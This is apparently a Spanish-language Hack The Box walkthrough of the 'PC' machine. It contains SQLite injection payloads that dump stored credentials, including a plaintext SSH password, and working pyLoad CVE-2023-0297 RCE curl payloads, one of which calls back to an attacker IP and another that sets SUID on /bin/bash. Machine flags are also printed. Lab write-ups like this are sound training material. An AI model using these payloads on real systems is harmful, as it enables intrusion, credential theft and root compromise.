---
title: PC HTB
date: 2023-07-19
tier: easy
author: naibu3
---

# Reconocimiento

Como siempre comenzamos lanzando [[nmap]], para tratar de buscar puertos abiertos:

```bash
sudo nmap -sS -p- --open --min-rate 5000 -n -Pn 10.10.11.214
```
```nmap
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown
```

Ahora tratamos de detectar versiones y servicios:

```bash
sudo nmap -sCV -p22,50051 -n -Pn 10.10.11.214
```
```nmap
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
50051/tcp open  unknown
```

Vemos que se trata de un puerto bastante raro. Además si tratamos de comunicarnos con [[curl]], nos da el siguiente mensaje de error:

```curl
Received HTTP/0.9 when not allowed
```

Si buscamos el error y *service*, encontraremos que puede tratarse de un servicio [[gRPC]]. Además, en este [artículo](https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9) se detalla bastante. Podemos utilizar la herramienta [[grpcurl]], pero es más cómoda [[grpcui]]. Así que la instalamos y utilizamos el siguiente comando:

```bash
grpcui -plaintext 10.10.11.214:50051
```

Se nos abrirá en el navegador una pestaña mediante la cuál podremos tramitar peticiones a la API. Si tratamos de hacer *login* con las credenciales *admin:admin*, veremos que nos dan un *Jason Web Token* ([[JWT]]) y un *ID*. Ahora, si tratamos de hacer una petición a *getInfo*, pasando el ID y el JWT, veremos un mensaje de error `Unexpected <class 'TypeError'>: 'NoneType' object is not subscriptable`. Si tratamos de capturar la petición con [[burpsuite]] y probamos con una inyección SQL ([[SQLI]]) como `OR 1=1-- -`, veremos que nos reporta un error, dándonos la pista de que pueda ser vulnerable a [[SQLI]].

# Explotación

Vamos a tratar de enumerar la base de datos, para ver que tipo de BD se trata, probaremos distintas funciones de cada gestor (puedes verlas en [HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection)). Si probamos con una de **SQLite**:

```sql
542 UNION SELECT sqlite_version()=sqlite_version()-- -
```

Vemos que funciona, por lo que el gestor es **SQLite**. Vamos a tratar ahora de enumerar las bases de datos (utilizaremos las inyecciones de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)):

```sql
542 UNIoN SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -
```

En la respuesta vemos dos tablas **accounts** y **messages**. Vamos a tratar de ver qué columnas hay en **accounts**:

```sql
542 UNIoN SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='accounts'-- -
```

Y vemos que hay dos columnas **username** y **password**. Ya podemos directamente tratar de listar los usuarios (debemos utilizar *group_concat*):

```sql
542 UNION SELECT group_concat(username) FROM accounts-- -
```

Y vemos que existen dos usuarios **admin** y **sau**. Vamos a tratar de listar sus contraseñas:

```sql
542 UNIoN SELECT group_concat(password) From accounts WHERE username='sau'-- -
```

Para *admin* ya sabíamos que era *admin*, y tenemos que para **sau** es **HereIsYourPassWord1431**. Si tratamos de acceder por [[22-ssh]], lograremos acceder y ver la **flag de usuario** (`83508536f23f17e1e05c57c82ed1c8cb`).

# Escalada de privilegios

Una vez dentro comenzaremos con el [[Reconocimiento del equipo]]. Como no vemos nada sospechoso lanzamos [[linpeas]]. Entre otras cosas, podemos ver que hay un servicio corriendo en el puerto 8000:

```linpeas
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::50051                :::*                    LISTEN      -
```

Así que hacemos [[port forwarding]]:

```bash
ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214
```

Si lanzamos [[nmap]]:

```bash
nmap -p8000 -sCV localhost
```
```nmap
PORT     STATE SERVICE VERSION
8000/tcp open  http    CherryPy wsgiserver
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Cheroot/8.6.0
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http%3A%2F%2Flocalhost%3A8000%2F
```

Vemos que está corriendo un servicio [[80-http]] con lo que parece un **pyLoad**. Si accedemos via navegador, confirmamos que se trata de dicho servicio. Veremos un panel de login en el que no parecen funcionar las credenciales por defecto.

Con una búsqueda por internet encontramos el siguiente [artículo](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad). Vemos que tenemos un [[RCE]]. Podemos comprobarlo montándonos un servidor http con [[python]] y tratando de mandarnos una petición desde el servidor:

```bash
curl -i -s -k -X $'POST' \                                                               
    --data-binary $'jk=pyimport%20os;os.system(\"curl%2010.10.16.114\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \ 
    $'http://localhost:8000/flash/addcrypted2'
```

Como recibimos la respuesta correctamente, podemos tratar de cambiar los privilegios de la bash:

```bash
curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"chmod%20+4777%20/bin/bash\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://localhost:8000/flash/addcrypted2'
```

Y ya con un `bash -p` ya seríamos root. La flag es (`a31593104e9b23a59b146166fc794f72`).